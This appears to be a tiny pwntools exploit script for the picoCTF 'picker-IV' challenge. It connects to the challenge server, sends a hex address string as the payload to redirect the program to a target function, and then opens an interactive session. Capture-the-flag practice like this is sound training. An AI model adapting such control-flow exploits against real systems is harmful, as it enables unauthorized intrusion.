from pwn import *

# pros = process("./picker-IV")
pros = remote("saturn.picoctf.net" , 64441)

payload = b"40129e"

pros.sendline(payload)
pros.interactive()
